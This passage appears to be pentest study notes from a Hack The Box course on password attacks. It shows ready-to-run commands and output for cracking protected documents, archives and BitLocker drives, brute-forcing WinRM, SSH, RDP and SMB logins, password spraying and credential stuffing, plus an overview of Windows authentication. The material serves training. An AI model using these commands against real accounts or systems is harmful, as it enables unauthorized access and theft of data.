You are likely to encounter a wide variety of documents that are password-protected to restrict access to authorized individuals. Today, most reports, documentation, and information sheets are commonly distributed as Microsoft Office documents or PDFs. John includes a Python script called ```office2john.py```, which can be used to extract password hashes from all common Office document formats. These hashes can then be supplied to John or Hashcat for offline cracking. The cracking procedure remains consistent with other hash types.

```bash
d41y@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
d41y@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
d41y@htb[/htb]$ john protected-docx.hash --show

Protected.docx:1234

1 password hash cracked, 0 left
```

The process for cracking PDF files is quite similar, as you simply swap out ```office2john.py``` for ```pdf2john.py```.

```bash
d41y@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
d41y@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
d41y@htb[/htb]$ john pdf.hash --show

PDF.pdf:1234

1 password hash cracked, 0 left
```

One of the primary challenges in this process is the generation and mutation of password lists, which is a prerequisite for successfully cracking password-protected files and access points. In many cases, using a standard or publicly known password list is no longer sufficient, as such lists are often recognized and blocked by built-in security mechanisms. These files may also be more difficult to crack - or not crackable at all within a reasonable timeframe - because users are increasingly required to choose longer, randomly generated passwords or complex passphrases. Nevertheless, attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.

### Cracking Protected Archives

There are many types of archive files. Some of the more commonly encountered file extensions include ```tar```, ```gz```, ```rar```, ```zip```, ```vmdb/vmx```, ```cpt```, ```truecrypt```, ```bitlocker```, ```kdbx```, ```deb```, ```7z```, and ```gzip```.

A comprehensive list of archive file types can be found [here](https://fileinfo.com/filetypes/compressed).

Note that not all archive types support native password protection, and in such cases, additional tools are often used to encrypt the files. For example, TAR files are commonly encrypted using ```openssl``` or ```gpg```.

#### Cracking ZIP Files

```bash
d41y@htb[/htb]$ zip2john ZIP.zip > zip.hash
d41y@htb[/htb]$ cat zip.hash 

ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
```

Once you have extracted the hash, you can use John to crack it with the desired password list.

```bash
d41y@htb[/htb]$ john --wordlist=rockyou.txt zip.hash

d41y@htb[/htb]$ john zip.hash --show

ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip

1 password hash cracked, 0 left
```

#### Cracking OpenSSL encrypted GZIP Files

It is not always immediately apparent whether a file is password-protected, particularily when the file extension corresponds to a format that does not natively support password protection. ```openssl``` can be used to encrypt files in the GZIP format. To determine the actual format of a file, you can use the ```file``` command, which provides detailed information about its content.

```bash
d41y@htb[/htb]$ file GZIP.gzip 

GZIP.gzip: openssl enc'd data with salted password
```

When cracking OpenSSL encrypted files, you may encounter various challenges, including numerous false positives or complete failure to identify the correct password. To mitigate this, a more reliable approach is to use the ```openssl``` tool within a for loop that attempts to extract the contents directly, succeeding only if the correct password is found.

```bash
d41y@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
<SNIP>
```

Once the for loop has finished, you can check the current directory for a newly extracted file.

```bash
d41y@htb[/htb]$ ls

customers.csv  GZIP.gzip  rockyou.txt
```

#### Cracking BitLocker-encrpyted Drives

BitLocker is a full-disk encryption feature developed by Microsoft for the Windows OS. It uses the AES encryption algorithm with either 128-bit or 256-bit key lengths. If the password or PIN used for BitLocker is forgotten, decryption can still be performed using a recovery key - a 48-digit string generated during the setup process.

In enterprise environments, virtual drives are sometimes used to store personal information, documents, or notes on company-issued devices to prevent unauthorized access. To crack a BitLocker encrypted drive, you can use a script called ```bitlocker2john``` to four different hashes: the first two correspond to the BitLocker password, while the latter two present the recovery key. Because the recovery key is very long and randomly generated, it is generally not practical to guess - unless partial knowledge is available. Therefore, you will focus on cracking the password using the first hash.

```bash
d41y@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
d41y@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
d41y@htb[/htb]$ cat backup.hash

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f
```

Once a hash is generated, either John or Hashcat can be used to crack it. For example, you will look at the procedure using Hashcat. The Hashcat mode associated with the BitLocker hash is ```-m 22100```. You supply the hash, speciy the wordlist, and define the hash mode. Since this encryption uses strong AES encryption, cracking may take considerable time depending on hardware performance.

```bash
d41y@htb[/htb]$ hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt

<SNIP>

$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22100 (BitLocker)
Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
Time.Started.....: Sat Apr 19 17:49:25 2025 (1 min, 56 secs)
Time.Estimated...: Sat Apr 19 17:51:21 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       25 H/s (9.28ms) @ Accel:64 Loops:4096 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2880/14344385 (0.02%)
Rejected.........: 0/2880 (0.00%)
Restore.Point....: 2816/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
Candidate.Engine.: Device Generator
Candidates.#1....: pirate -> soccer9
Hardware.Mon.#1..: Util:100%

Started: Sat Apr 19 17:49:05 2025
Stopped: Sat Apr 19 17:51:22 2025
```

After successfully cracking the password, you can access the encrypted drive.

##### Mounting BitLocker-encrypted Drives in Windows

The easiest method for mounting a BitLocker virtual drive on Windows is to double-click the ```.vhd``` file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.

##### Mounting BitLocker-encrypted Drives in Linux (_or macOS_)

It is also possible to mount BitLocker-encrypted drives in Linux. To do this, you can use a tool called [dislocker](https://github.com/Aorimn/dislocker).

First, you need to install the package:

```bash
d41y@htb[/htb]$ sudo apt-get install dislocker
```

Next, you create two folders which you will use to mount the VHD:

```bash
d41y@htb[/htb]$ sudo mkdir -p /media/bitlocker
d41y@htb[/htb]$ sudo mkdir -p /media/bitlockermount
```

You then use ```losetup``` to configure the VHD as loop device, decrypt the drive using ```dislocker```, and finally mount the decrypted volume:

```bash
# Find the next available loop device and associate it with the VHD file (mounts partitions too with -P)
d41y@htb[/htb]$ sudo losetup -f -P Backup.vhd
# Use dislocker to decrypt the BitLocker-encrypted partition (loop0p2) using the password "1234qwer"
# The decrypted data is written as a file called `dislocker-file` inside /media/bitlocker
d41y@htb[/htb]$ sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
# Mount the decrypted "dislocker-file" (which is a virtual NTFS drive) as a loop device
# so the contents can be accessed via /media/bitlockermount
d41y@htb[/htb]$ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

If everything was done correctly, you can now browse the files:

```bash
d41y@htb[/htb]$ cd /media/bitlockermount/
d41y@htb[/htb]$ ls -la
```

Once you have analyzed the files on the mounted drive, you can unmount it using the following commands:

```bash
d41y@htb[/htb]$ sudo umount /media/bitlockermount
d41y@htb[/htb]$ sudo umount /media/bitlocker
```

> [!NOTE]
> To find the loop device which was picked:<br>
> ```losetup -j Backup.vhd```

## Remote Password Attacks

During your pentests, every computer network you encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web apps, these services include FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, and LDAP.

### WinRM

... is the Microsoft implementation of the Web Service Management Protocol. It is a network protocol based on XML web services using the Simple Object Access Protocol used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management and the Windows Management Instrumentation, which can call the Distributed Component Object Model.

By default, WinRM uses the TCP ports 5985 and 5986.

A handy tool you can use for your password attacks is NetExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.

#### NetExec

##### Installing

```bash
d41y@htb[/htb]$ sudo apt-get -y install netexec
```

##### Menu Options

```bash
d41y@htb[/htb]$ netexec -h

usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...

     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ॱ \   / ॱ
     ॱ   ॱ

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx
    
    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.3.0
    Codename: NeedForSpeed
    Commit  : Kali Linux
    

options:
  -h, --help            show this help message and exit

Generic:
  Generic options for nxc across protocols

  --version             Display nxc version
  -t, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
    nfs                 own stuff using NFS
    ftp                 own stuff using FTP
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
    smb                 own stuff using SMB
    wmi                 own stuff using WMI
    rdp                 own stuff using RDP
    mssql               own stuff using MSSQL
    ldap                own stuff using LDAP
    vnc                 own stuff using VNC
```

##### Protocol-Specific Help

```bash
d41y@htb[/htb]$ netexec smb -h

usage: netexec smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
                   [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding] [--no-bruteforce]
                   [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                   [--server {http,https}] [--server-host HOST] [--server-port PORT] [--connectback-host CHOST] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options]
                   [-H HASH [HASH ...]] [--delegate DELEGATE] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT]
                   [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--sam] [--lsa] [--ntds [{vss,drsuapi}]] [--dpapi [{cookies,nosystem} ...]]
                   [--sccm [{disk,wmi}]] [--mkfile MKFILE] [--pvk PVK] [--enabled] [--user USERNTDS] [--shares] [--interfaces] [--no-write-check]
                   [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--sessions] [--disks] [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER ...]]
                   [--groups [GROUP]] [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE]
                   [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH] [--only-files] [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]]
                   [--put-file FILE FILE] [--get-file FILE FILE] [--append-host] [--exec-method {atexec,wmiexec,mmcexec,smbexec}] [--dcom-timeout DCOM_TIMEOUT]
                   [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32]
                   [--no-encode]
                   target [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

<SNIP>
```

##### Usage

```bash
d41y@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

##### Example

```bash
d41y@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

The appearance of ```(Pwn3d!)``` is the sign that you can most likely execute system commands if you log in with the brute-forced user.

#### Evil-WinRM

Another handy tool that you can use to communicate with the WinRM service is Evil-WinRM, which allows you to communicate with the WinRM service efficiently.

##### Installing

```bash
d41y@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

##### Usage

```bash
d41y@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

##### Example

```bash
d41y@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

### SSH

... is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by defauolt, to which you can connect using an SSH client.

#### Hydra

You can use a tool like Hydra to brute force SSH.

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

To log in to the system via the SSH protocol, you can use the OpenSSH client, which is available by default on most Linux distros.

```bash
d41y@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

### RDP

... is a network protocol that allows remote access to Windows systems via TCP port 3389, by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but is also used in some third-party solutions.

#### Hydra

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

#### xFreeRDP

Linux offers different clients to communicate with the desired server using the RDP protocol. These include Remmina, xfreerdp, and many others.

##### Usage

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

##### Example

```bash
d41y@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

<SNIP>

New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

... spawns a new window with a running Windows session.

### SMB

... is a protocol responsible for transferring data between a client and a server in local area network. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.

It is also known as Common Internet File System (_CIFS_). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux or macOS. In addition, you will often encounter Samba, which is an open-source implementation of the above functions. For SMB, you can also use Hydra again to try different usernames in combination with different passwords.

#### Hydra

##### Example

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

##### Error

However, you may also get the following error describing that the server has sent an invalid reply.

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because you most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, you can manually update and recompile Hydra or use another tool, like Metasploit.

#### Metasploit

```bash
d41y@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### NetExec

Now you can use NetExec again to view the available shares and what privileges you have for them.

```bash
d41y@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

#### SMB

To communicate with the server via SMB, you can use, for example, the tool smbclient. This tool will allow you to view the contents of the shares, upload, or download files if your privileges allow it.

```bash
d41y@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

### Spraying, Stuffing, and Defaults

#### Password Spraying

... is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use ```ChangeMe123!``` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.

Depending on the target system, different tools may be used to carry out password spraying attacks. For web apps, Burp is a strong option, while for AD environments, tools such as NetExec or Kerbrute are commonly used.

```bash
d41y@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

#### Credential Stuffing

... is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms, these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system. For example, if you have a list of ```username:password``` credentials obtained from a database leak, you can use Hydra to perform a credential stuffing attack against an SSH service using the following syntax:

```bash
d41y@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```

#### Default Credentials

Many systems - such as routers, firewalls, and databases - come with defautl credentials. While best practice dictates that admins change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which can be installed with ```pip3```.

```bash
d41y@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```

Once installed, you can use the ```creds``` command to search for known default credentials associated with a specific product or vendor.

```bash
d41y@htb[/htb]$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```

In addition to publicly available lists and tools, default credentials can often be found in product documentation, which typically outlines the steps required to set up a service. While some devices and applications prompt the user to set a password during installation, others use a default - often weak - password.

Imagine you have identified certain apps in use on a customer's network. After researching the default credentials online, you can combine them into a new list, formatted as ```username:password```, and reuse the previously mentioned Hydra to attempt access.

Beyond apps, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/). While it is less likely that the router credentials remain unchanged, oversights do occur. Routers used in internal testing environments, for example, may be left with default settings and can be exploited to gain further access.

## Windows Systems

### Authentication Process

The Windows client authentication process involves multiple modules for logon, credential retrieval, and verification. Among the various authentication mechanisms in Windows, Kerberos is one of the most widely used and complex. The Local Security Authority (_LSA_) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (_SIDs_).

The security subsystems maintains security policies and user accounts on a computer system. On a DC, these policies and accounts apply to the entire domain and are stored in AD. Additionally, the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.

![password attacks 1](../../images/password_attacks_1.png)

Local interactive logon is handled through the coordination of several components: the logon process (_WinLogon_), the logon user interface process (_LogonUI_), credential providers, the Local Security Authority Subsystem Service (_LSASS_), one or more authentication packages, and either the Security Accounts Manager (_SAM_) or AD. Authentication packages, in this context, are Dynamic-Link-Libraries (_DLLs_) responsible for performing authentication checks. For example, for non-domain-joined and interactive logins, the Msv1_0.dll authentication package is typically used.

WinLogon is a trusted system process responsible for managing security-related user interactions, such as:

- launching LogonUI to prompt for credentials at login
- handling password changes
- locking and unlocking the workstation

To obtain a user's account name and password, WinLogon relies on credential providers installed on the system. These credential providers are CDM objects implemented as DLLs.

WinLogon is the only process that intercepts login requests from the keyboard, which are sent via RPC messages from Win32k.sys. At logon, it immediately launches the LogonUI application to present the graphical user interface. Once the user's credentials are collected by the credential provider, WinLogon passes them to the Local Security Authority Subsystem Service (_LSASS_) to authenticate the user.

#### LSASS

... is compromised of multiple modules and governs all authentication processes. Located at ```%SystemRoot%\System32\Lsass.exe``` in the file system, it is responsible for enforcing the local security policy, authentication users, and forwarding security audit logs to the Event Log. In essence, LSASS servers are the gatekeeper in Windows-based OS.

| Authentication Packages | Description |
| ----------------------- | ----------- |
| Lsasrv.dll | the LSA Server service both enforces security policies and acts as the security package manager for the LSA; the LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful |
| Msv1_0.dll | authentication package for local machine logons that don't require custom authentication |
| Samsrv.dll | the Security Accounts Manager (_SAM_) stores local security accounts, enforces locally stored policies, and supports APIs |
| Kerberos.dll | security package loaded by the LSA for Kerberos-based authentication on a machine |
| Netlogon.dll | network-based logon service |
| Ntdsa.dll | the library is used to create new records and folders in the Windows registry |

Each interactive logon session creates a separate instance of the WinLogon service. The Graphical Identification and Authentication (_GINA_) architecture is loaded into the process area used by WinLogon, receives and processes the credentials, and invokes the authentication interfaces via the LSALogonUser function.

#### SAM Database

